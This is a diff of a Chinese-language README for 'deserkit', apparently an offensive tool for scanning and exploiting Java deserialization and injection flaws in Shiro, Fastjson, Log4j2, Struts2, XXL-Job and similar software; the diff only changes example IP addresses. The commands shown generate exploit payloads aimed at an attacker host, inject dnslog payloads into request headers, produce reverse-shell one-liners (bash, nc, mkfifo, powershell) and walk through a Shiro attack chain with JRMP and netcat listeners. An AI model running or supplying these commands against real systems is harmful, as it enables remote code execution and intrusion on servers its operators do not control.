@@ -92,13 +92,13 @@ python gui_server.py --port 8899 --strict-port  # 端口不可用就直接退出
 
 ```bash
 # 单目标，检测全部 10 个组件
-python deserkit.py scan -u http://192.168.184.162:8080
+python deserkit.py scan -u http://192.168.1.10:8080
 
 # 批量（urls.txt 每行一个 URL），16 线程，显示明细
 python deserkit.py scan -f urls.txt -t 16 -v
 
 # 只测指定组件
-python deserkit.py scan -u http://192.168.184.162:8080 -c shiro,fastjson,springboot
+python deserkit.py scan -u http://192.168.1.10:8080 -c shiro,fastjson,springboot
 
 # Log4j2 盲打验证（会向 UA/Referer/XFF 注入 dnslog payload）
 python deserkit.py scan -u http://target --dnslog abc123.dnslog.cn -c log4j2
@@ -112,10 +112,10 @@ python deserkit.py scan -f urls.txt -o result.json
 ### 2. Payload 生成
 
 ```bash
-python deserkit.py payload -c fastjson --lhost 192.168.184.132 --lport 9988 --dnslog x.dnslog.cn --cmd "id"
-python deserkit.py payload -c shiro --lhost 192.168.184.132 --jrmp 10099
+python deserkit.py payload -c fastjson --lhost 192.168.1.100 --lport 9988 --dnslog x.dnslog.cn --cmd "id"
+python deserkit.py payload -c shiro --lhost 192.168.1.100 --jrmp 10099
 python deserkit.py payload -c struts2 --cmd "whoami"
-python deserkit.py payload -c xxljob --lhost 192.168.184.132 --lport 9988
+python deserkit.py payload -c xxljob --lhost 192.168.1.100 --lport 9988
 ```
 
 可选：`fastjson` `log4j2` `shiro` `jboss` `struts2` `nacos` `xxljob` `springboot` `jackson`
@@ -123,7 +123,7 @@ python deserkit.py payload -c xxljob --lhost 192.168.184.132 --lport 9988
 ### 3. 反弹 Shell
 
 ```bash
-python deserkit.py shell --lhost 192.168.184.132 --lport 9988
+python deserkit.py shell --lhost 192.168.1.100 --lport 9988
 ```
 
 输出 bash / bash-base64（Java Runtime.exec 专用）/ nc / mkfifo / python / php / perl / powershell 八种。
@@ -282,15 +282,15 @@ netsh advfirewall firewall delete rule name="deserkit-lab"
 
 ```bash
 # 1. 指纹确认
-python deserkit.py scan -u http://192.168.184.162:8080 -c shiro
+python deserkit.py scan -u http://192.168.1.10:8080 -c shiro
 
 # 2. 生成 payload 与命令序列
-python deserkit.py payload -c shiro --lhost 192.168.184.132 --jrmp 10099 --lport 9988
+python deserkit.py payload -c shiro --lhost 192.168.1.100 --jrmp 10099 --lport 9988
 
 # 3. 按输出的命令依次执行：
 #    a) 攻击机起 JRMP 监听（ysoserial 需 JDK 8）
 #    b) nc -lvvp 9988
-#    c) python3 shiropoc.py 192.168.184.132:10099
+#    c) python3 shiropoc.py 192.168.1.100:10099
 #    d) curl 带 rememberMe Cookie 打过去
 ```
 
